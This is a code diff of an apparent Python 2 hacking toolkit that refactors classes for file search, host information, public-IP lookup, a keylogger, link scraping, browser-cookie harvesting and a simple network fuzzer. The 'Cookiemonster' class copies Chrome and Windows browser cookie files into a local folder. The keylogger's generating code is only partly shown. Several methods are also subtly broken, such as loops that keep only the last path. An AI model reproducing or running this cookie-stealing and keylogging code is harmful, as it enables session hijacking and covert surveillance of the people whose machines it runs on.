@@ -6,6 +6,7 @@ from tqdm import tqdm
 from shutil import copy
 from argparse import *
 from bs4 import BeautifulSoup
+from socket import *
 
 
 class ArgParser(ArgumentParser):
@@ -18,18 +19,31 @@ class ArgParser(ArgumentParser):
     def parse(self):
         return self.parse_args()
 
+    def __enter__(self):
+        return self
+
+    def __exit__(self, type, error, traceback):
+        print traceback
+        print error
+
 
 class Seeker(object):
     # loops  files given path and matches a particular string.
-    def __init_(self, filename_arg, path_arg):
-        self.filename = filename_arg.lower()
-        self.path = path_arg
+    def __init__(self):
+        print 'Searching..'
 
-    def search_file():
-        for path, directories, files in walk(self.path):
+    def search_file(self, filename, path):
+        for path, directories, files in os.walk(path):
             for file in files:
-                if self.filename in file.lower():
-                    print path.join(path, file)
+                if filename.lower() in file.lower():
+                    print os.path.join(path, file)
+
+    def __enter__(self):
+        return self
+
+    def __exit__(self, type, error, traceback):
+        print traceback
+        print error
 
 
 class System(object):
@@ -42,23 +56,32 @@ class System(object):
 
     def get(self):
         # Output The Result
-        print '[+]Host Information'
-        print '-' * 60
-        print '[+]Platform:', self.platform
-        print '[+]Architecture:', self.architecture
-        print '[+]Hostname:', self.hostname
-        print '[+]Processor:', self.processor
-        print '-' * 60
+        return self.platform, self.architecture, self.hostname, self.processor
+
+    def __enter__(self):
+        return self
+
+    def __exit__(self, type, error, traceback):
+        print traceback
+        print error
 
 
 class Ip(object):
-    # Fetches Website Content, and grabs the ip
+    # Fetches ip using http://checkip.dyndns.org
     def __init__(self):
         self.url = 'http://checkip.dyndns.org'
 
-    def get_ipv4(self):
+    def get(self):
         request = requests.get(self.url)
-        ip = re.findall("\d{1,3}\.\d{1,3}\.\d{1,3}.\d{1,3}", request.text)
+        ip = re.findall("\d{1,3}\.\d{1,3}\.\d{1,3}.\d{1,3}", request.text)[0]
+        return ip
+
+    def __enter__(self):
+        return self
+
+    def __exit__(self, type, error, traceback):
+        print traceback
+        print error
 
 
 class Keylogger(object):
@@ -114,17 +137,37 @@ class Keylogger(object):
             source.write(self.code)
             source.close()
 
+    def __len__(self):
+        return len(self.code)
+
+    def __enter__(self):
+        return self
+
+    def __exit__(self, type, error, traceback):
+        print traceback
+        print error
+
 
 class Scrape(object):
     # Fecthes a Specific page and finds links
-    def __init__(self, scrape_all_links_arg):
-        self.page = requests.get('http://{}/'.format(scrape_all_links_arg))
+    def __init__(self, page):
+        self.page = requests.get('http://{}/'.format(page))
         self.content = self.page.content
         self.href_parser = BeautifulSoup(self.content, "html.parser")
 
-    def scrape_all_links(self):
+    def scrape(self):
         for link in tqdm(self.href_parser.findAll('a')):
             print link.get('href')
+
+    def __len__(self):
+        return len(self.href_parser.findAll('a'))
+
+    def __enter__(self):
+        return self
+
+    def __exit__(self, type, error, traceback):
+        print traceback
+        print error
 
 
 class Cookiemonster(object):
@@ -144,7 +187,16 @@ class Cookiemonster(object):
                                 'C:\users\{}\AppData\Local\Google\Chrome\User Data\Default\Cookies'.format(self.user),
                                 'C:\Users\{}\AppData\Local\Microsoft\Windows\INetCookies'.format(self.user)]
 
-    def fetch(self):
+    def show(self):
+        for paths in self.cookie_paths:
+            continue
+        for file in tqdm(os.listdir(paths)):
+            try:
+                print os.path.join(paths, file)
+            except Exception as e:
+                pass
+
+    def save(self):
         if not os.path.exists(self.cookiejar):
             os.mkdir('cookiejar')
         for paths in self.cookie_paths:
@@ -154,3 +206,49 @@ class Cookiemonster(object):
                 copy(os.path.join(paths, file), self.cookiejar)
             except Exception as e:
                 pass
+
+    def __len__(self):
+        files = []
+        for paths in self.cookie_paths:
+            continue
+        for file in os.listdir(paths):
+            try:
+                files.append(os.path.join(paths, file))
+            except Exception as e:
+                pass
+        return len(files)
+
+    def __enter__(self):
+        return self
+
+    def __exit__(self, type, error, traceback):
+        print traceback
+        print error
+
+
+class NetFuzzer(object):
+    # Fuzzer For Network Services
+    def __init__(self, host, port):
+        self.sock = socket()
+        self.host = host
+        self.port = port
+
+    def fuzz(self, chars, length):
+        self.Buffer = chars * length
+        self.sock.connect((self.host, self.port))
+        self.sock.send(self.Buffer)
+        return self.sock.recv(4096), self.Buffer
+
+    def __len__(self):
+        return len(self.Buffer)
+
+    def __enter__(self):
+        return self
+
+    def __exit__(self, type, error, traceback):
+        print traceback
+        print error
+
+with ArgParser() as aarg:
+    aarg.add_option('-s', '--s')
+    aarg.parse()
